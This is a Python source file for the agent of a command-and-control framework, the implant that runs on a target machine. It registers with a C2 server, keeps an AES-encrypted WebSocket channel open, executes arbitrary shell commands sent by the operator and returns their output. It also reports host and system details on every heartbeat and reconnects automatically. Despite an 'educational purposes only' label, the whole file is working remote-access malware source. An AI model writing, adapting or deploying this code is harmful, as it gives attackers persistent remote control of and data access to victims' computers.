#!/usr/bin/env python3
"""
C2 Framework - Agent/Payload
Educational purposes only - Use in authorized environments
"""

import asyncio
import websockets
import json
import platform
import socket
import subprocess
import os
import sys
import base64
from datetime import datetime
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad
from Crypto.Random import get_random_bytes
import psutil
import time
import requests

# Configuration
C2_SERVER = "ws://localhost:8001/api/ws"  # Change to your C2 server
API_SERVER = "http://localhost:8001/api"  # API endpoint for registration
AES_KEY = "ba4gd0qnveoxHglI4OL8n0jRAteGLexoWN2FbOH2zsU="  # Must match server
HEARTBEAT_INTERVAL = 30  # seconds
RECONNECT_DELAY = 5  # seconds

class Agent:
    def __init__(self):
        self.node_id = None
        self.node_token = None
        self.websocket = None
        self.running = True
        self.registered = False
        
    def encrypt_message(self, plaintext: str) -> str:
        """Encrypt message with AES-256"""
        try:
            key = base64.b64decode(AES_KEY)
            cipher = AES.new(key, AES.MODE_CBC)
            ct_bytes = cipher.encrypt(pad(plaintext.encode('utf-8'), AES.block_size))
            iv = base64.b64encode(cipher.iv).decode('utf-8')
            ct = base64.b64encode(ct_bytes).decode('utf-8')
            return json.dumps({'iv': iv, 'ciphertext': ct})
        except Exception as e:
            print(f"[ERROR] Encryption failed: {e}")
            return ""
    
    def decrypt_message(self, encrypted: str) -> str:
        """Decrypt message from server"""
        try:
            data = json.loads(encrypted)
            key = base64.b64decode(AES_KEY)
            iv = base64.b64decode(data['iv'])
            ct = base64.b64decode(data['ciphertext'])
            cipher = AES.new(key, AES.MODE_CBC, iv)
            pt = unpad(cipher.decrypt(ct), AES.block_size)
            return pt.decode('utf-8')
        except Exception as e:
            print(f"[ERROR] Decryption failed: {e}")
            return ""
    
    def get_system_info(self):
        """Collect system information"""
        try:
            hostname = socket.gethostname()
            os_info = f"{platform.system()} {platform.release()}"
            try:
                ip = socket.gethostbyname(hostname)
            except:
                ip = "127.0.0.1"
            
            return {
                "hostname": hostname,
                "os": os_info,
                "ip": ip
            }
        except Exception as e:
            print(f"[ERROR] Failed to get system info: {e}")
            return {
                "hostname": "unknown",
                "os": "unknown",
                "ip": "0.0.0.0"
            }
    
    def register_node(self):
        """Register with C2 server"""
        try:
            system_info = self.get_system_info()
            response = requests.post(
                f"{API_SERVER}/nodes/register",
                json=system_info,
                timeout=10
            )
            
            if response.status_code == 200:
                data = response.json()
                self.node_id = data['id']
                self.node_token = data['token']
                self.registered = True
                print(f"[SUCCESS] Registered with C2 - Node ID: {self.node_id}")
                return True
            else:
                print(f"[ERROR] Registration failed: {response.status_code}")
                return False
        except Exception as e:
            print(f"[ERROR] Registration exception: {e}")
            return False
    
    def execute_command(self, command: str) -> str:
        """Execute system command"""
        try:
            if sys.platform == "win32":
                result = subprocess.run(
                    command,
                    shell=True,
                    capture_output=True,
                    text=True,
                    timeout=30
                )
            else:
                result = subprocess.run(
                    command,
                    shell=True,
                    capture_output=True,
                    text=True,
                    timeout=30
                )
            
            output = result.stdout if result.stdout else result.stderr
            return output if output else "Command executed (no output)"
        
        except subprocess.TimeoutExpired:
            return "Command timeout exceeded"
        except Exception as e:
            return f"Execution error: {str(e)}"
    
    def get_extended_sysinfo(self):
        """Get detailed system information"""
        try:
            cpu_percent = psutil.cpu_percent(interval=1)
            memory = psutil.virtual_memory()
            disk = psutil.disk_usage('/')
            
            return {
                "node_id": self.node_id,
                "cpu_usage": cpu_percent,
                "memory_usage": memory.percent,
                "disk_usage": disk.percent,
                "processes": len(psutil.pids())
            }
        except Exception as e:
            print(f"[ERROR] Failed to get extended sysinfo: {e}")
            return None
    
    async def send_sysinfo(self):
        """Send system info to C2"""
        try:
            sysinfo = self.get_extended_sysinfo()
            if sysinfo:
                requests.post(f"{API_SERVER}/sysinfo", json=sysinfo, timeout=5)
        except Exception as e:
            print(f"[ERROR] Failed to send sysinfo: {e}")
    
    async def heartbeat_loop(self):
        """Send periodic heartbeat"""
        while self.running:
            try:
                if self.websocket and self.websocket.open:
                    message = json.dumps({"type": "heartbeat", "node_id": self.node_id})
                    encrypted = self.encrypt_message(message)
                    await self.websocket.send(encrypted)
                    
                    # Send system info every heartbeat
                    await self.send_sysinfo()
                    
                await asyncio.sleep(HEARTBEAT_INTERVAL)
            except Exception as e:
                print(f"[ERROR] Heartbeat failed: {e}")
                await asyncio.sleep(HEARTBEAT_INTERVAL)
    
    async def handle_message(self, encrypted_message: str):
        """Handle incoming messages from C2"""
        try:
            decrypted = self.decrypt_message(encrypted_message)
            if not decrypted:
                return
            
            message = json.loads(decrypted)
            msg_type = message.get('type')
            
            if msg_type == 'command':
                command_id = message.get('command_id')
                command = message.get('command')
                
                print(f"[COMMAND] Executing: {command}")
                result = self.execute_command(command)
                
                # Send result back
                response = json.dumps({
                    "type": "command_result",
                    "command_id": command_id,
                    "result": result,
                    "status": "executed"
                })
                encrypted = self.encrypt_message(response)
                await self.websocket.send(encrypted)
                
            elif msg_type == 'kill':
                print("[ALERT] Kill switch activated - Self destructing...")
                self.running = False
                # Optional: self-destruct operations here
                sys.exit(0)
            
            elif msg_type == 'ack':
                pass  # Acknowledgment received
                
        except Exception as e:
            print(f"[ERROR] Failed to handle message: {e}")
    
    async def connect_to_c2(self):
        """Maintain connection to C2 server"""
        while self.running:
            try:
                # Register if not already registered
                if not self.registered:
                    if not self.register_node():
                        print(f"[RETRY] Retrying registration in {RECONNECT_DELAY}s...")
                        await asyncio.sleep(RECONNECT_DELAY)
                        continue
                
                # Connect via WebSocket
                ws_url = f"{C2_SERVER}/{self.node_token}"
                print(f"[CONNECT] Connecting to C2 server...")
                
                async with websockets.connect(ws_url, ping_interval=20, ping_timeout=10) as websocket:
                    self.websocket = websocket
                    print("[SUCCESS] Connected to C2 server")
                    
                    # Start heartbeat
                    heartbeat_task = asyncio.create_task(self.heartbeat_loop())
                    
                    try:
                        # Listen for messages
                        async for message in websocket:
                            await self.handle_message(message)
                    finally:
                        heartbeat_task.cancel()
                        
            except websockets.exceptions.WebSocketException as e:
                print(f"[ERROR] WebSocket error: {e}")
            except Exception as e:
                print(f"[ERROR] Connection error: {e}")
            
            if self.running:
                print(f"[RECONNECT] Reconnecting in {RECONNECT_DELAY}s...")
                await asyncio.sleep(RECONNECT_DELAY)
    
    def run(self):
        """Start the agent"""
        print("=" * 60)
        print("C2 Framework Agent - Starting...")
        print("=" * 60)
        
        try:
            asyncio.run(self.connect_to_c2())
        except KeyboardInterrupt:
            print("\n[EXIT] Agent stopped by user")
            self.running = False
        except Exception as e:
            print(f"[FATAL] Agent crashed: {e}")

if __name__ == "__main__":
    agent = Agent()
    agent.run()
